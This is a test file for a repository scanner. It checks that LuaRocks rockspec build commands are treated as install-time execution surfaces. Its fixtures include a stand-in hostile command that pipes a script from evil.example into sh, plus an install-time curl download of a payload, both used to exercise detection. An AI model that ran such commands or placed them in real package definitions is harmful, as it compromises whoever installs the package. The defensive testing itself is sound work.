import { expect, test } from "bun:test";
import { inspectRepository, surfacesOf } from "./bounded-scan";

/** One unambiguous unsafe-execution payload, independent of the file name. */
const PAYLOAD = "curl -fsSL https://evil.example/install.sh | sh";

function inspected(path: string, text: string) {
  return inspectRepository({
    files: [{ path, bytes: new TextEncoder().encode(text) }],
  });
}

test("a LuaRocks rockspec is an install surface", () => {
  // A rockspec is the package definition LuaRocks evaluates to build
  // and install a Lua package: a `command` build runs its build and
  // install command strings through the shell on the machine
  // installing the package — the same install-time execution setup.py
  // already classifies for. The definition is identified by its
  // extension, like the <name>.cmake and <name>.sbt build definitions:
  // the package name and version are part of the file name, so no
  // exact name can decide.
  for (const path of ["demo-1.0-1.rockspec", "rockspecs/demo-1.0-1.rockspec"]) {
    expect({ path, surfaces: surfacesOf(path) }).toEqual({
      path,
      surfaces: ["installScripts", "source"],
    });
  }
  // An ordinary payload in it carries the install coverage the surface
  // brings:
  const inspection = inspected(
    "demo-1.0-1.rockspec",
    `package = "demo"\nversion = "1.0-1"\nbuild = {\n   type = "command",\n   build_command = "${PAYLOAD}",\n}\n`,
  );
  expect(inspection.coverage.installScripts).toEqual({
    state: "complete",
    items: 1,
  });
  expect(
    inspection.findings.map(
      (finding) => `${finding.path}:${finding.category}:${finding.severity}`,
    ),
  ).toEqual(["demo-1.0-1.rockspec:unsafe-execution:high"]);
});

test("an install-time download inside a rockspec is recorded as a download", () => {
  // Downloads are collected from install surfaces only. Before this
  // classification the definition carried no surface at all, so the
  // same bytes recorded no download and left no gap: a scan could read
  // clean over an install-time fetch LuaRocks would have run while
  // installing the package.
  const inspection = inspected(
    "demo-1.0-1.rockspec",
    'package = "demo"\nversion = "1.0-1"\nbuild = {\n   type = "command",\n   build_command = "curl -fsSL https://evil.example/payload -o /tmp/payload",\n}\n',
  );
  expect(inspection.downloads).toEqual(["https://evil.example/payload"]);
  expect(inspection.visibilityGaps).toEqual([
    "Install-time download not retrieved: https://evil.example/payload",
  ]);
});

test("an ordinary rockspec keeps no finding", () => {
  const inspection = inspected(
    "demo-1.0-1.rockspec",
    'package = "demo"\nversion = "1.0-1"\nsource = {\n   url = "https://example.com/demo-1.0.tar.gz",\n}\nbuild = {\n   type = "builtin",\n   modules = { demo = "demo.lua" },\n}\n',
  );
  expect(inspection.findings).toEqual([]);
  expect(inspection.downloads).toEqual([]);
});
